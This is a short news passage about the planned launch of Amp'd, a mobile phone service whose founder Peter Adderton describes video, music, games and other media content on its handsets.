When Amp'd begins service , its handsets will practically overflow with content and features more commonly associated with television and the Internet , said Peter Adderton , the 38 - year - old founder and chief executive of the company .
The offerings planned at the outset late this year include full - motion video of news , sports , concerts and other live events , as well as movie and television clips and music videos .
Added to the mix will be high - speed music downloads , 3 - D games , video blogs , a dating service , text messaging and an assortment of ring tones and wallpaper .
And , of course , Amp'd phones will handle conventional calls , Mr. Adderton said .
" I think our launch is going to fuel the mobile media community in the United States , " he said in an interview .
" We are thinking of it from a media perspective and an entertainment perspective rather than from a wireless perspective . "
